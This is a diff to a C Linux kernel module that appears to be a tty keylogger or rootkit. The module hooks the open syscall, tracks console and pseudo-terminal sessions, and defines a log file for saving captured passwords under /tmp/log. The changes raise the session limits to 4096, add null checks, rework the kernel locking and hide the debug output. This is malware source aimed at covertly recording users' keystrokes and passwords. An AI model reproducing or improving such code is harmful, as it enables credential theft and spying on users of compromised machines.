@@ -45,8 +45,8 @@ MODULE_LICENSE("GPL");
 // the number of loggers and such
 #define N_TTY_NAME "tty"
 #define N_PTS_NAME "pts"
-#define MAX_TTY_CON 8 // max tty connections
-#define MAX_PTS_CON 256 // max pts connections
+#define MAX_TTY_CON 128 // max tty connections
+#define MAX_PTS_CON 4096 // max pts connections
 #define LOG_DIR "/tmp/log" // where the log will be saved
 #define PASS_LOG LOG_DIR "pass.log" // where passwords will be saved.
 // PASS_LOG is only used for smart logging
@@ -79,10 +79,10 @@ MODULE_LICENSE("GPL");
 
 // helps determine device number, which should be between
 // 0 and MAX_TTY_CON... I think
-#define TTY_NUMBER(tty) MINOR((tty)->dev->devt) - (tty)->driver->minor_start \
-  + (tty)->driver->name_base
+#define TTY_NUMBER(tty) MINOR(tty->dev->devt) - tty->driver->minor_start \
+  + tty->driver->name_base
 // determines the tty index in our array of loggers
-#define TTY_INDEX(tty) tty->driver->type == \
+#define TTY_INDEX(tty) tty->driver->type ==	\
     TTY_DRIVER_TYPE_PTY ? MAX_TTY_CON + \
     TTY_NUMBER(tty):TTY_NUMBER(tty)
 // checks if echoing is disabled... I think
@@ -153,28 +153,45 @@ asmlinkage long new_open(const char *filename, int flags, int mode) {
     // get the file associated with fd
     struct file* file = NULL;
     struct tty_struct* tty = NULL;
+    struct tty_file_private* priv = NULL;
 
+    lock_kernel();
+    begin_kmem();
     file = fget(ret);
-    tty = file->private_data;
+    if (file != NULL) tty = file->private_data;
     // test the validity of the tty
     if(tty != NULL){
-      begin_kmem();
-      lock_kernel();
-      printk(KERN_ALERT "tty address is %08x\n",tty);
+      // create pointers to the tty fields we need
       struct device* dev = NULL;
+      struct tty_driver* driver = NULL;
+      struct tty_ldisc* ldisc = NULL;
       dev = tty->dev;
-      if (dev != NULL){
-	printk(KERN_ALERT "tty has device at %08x\n", dev);
-	if(dev->devt != NULL){
-	  printk(KERN_ALERT "devt is %u\n",dev->devt);
+      driver = tty->driver;
+      ldisc = tty->ldisc;
+      if (dev != NULL && driver != NULL && ldisc != NULL){
+#ifdef DEBUG
+	printk(KERN_ALERT "devt is %u\n",dev->devt);
+	printk(KERN_ALERT "driver type is %u\n",driver->type);
+	printk(KERN_ALERT "device number is %d\n",TTY_NUMBER(tty));
+	printk(KERN_ALERT "tty name is %s\n",tty->name);
+#endif
+	// don't continue until we know the driver is the corrent type
+	if((driver->type == TTY_DRIVER_TYPE_CONSOLE &&
+	    TTY_NUMBER(tty) < MAX_TTY_CON - 1) ||
+	   driver->type == TTY_DRIVER_TYPE_PTY &&
+	   driver->subtype == PTY_TYPE_SLAVE &&
+	   TTY_NUMBER(tty) < MAX_PTS_CON){
+#ifdef DEBUG
+	  printk(KERN_ALERT "we have a valid tty\n");
+#endif
 	}
       }
-      struct tty_driver* driver = NULL;
-      driver = tty->driver;
-      end_kmem();
-      unlock_kernel();
+      //end_kmem();
+      //unlock_kernel();
     }
     if(file != NULL) fput(file);
+    end_kmem();
+    unlock_kernel();
   }
   return ret;
 }
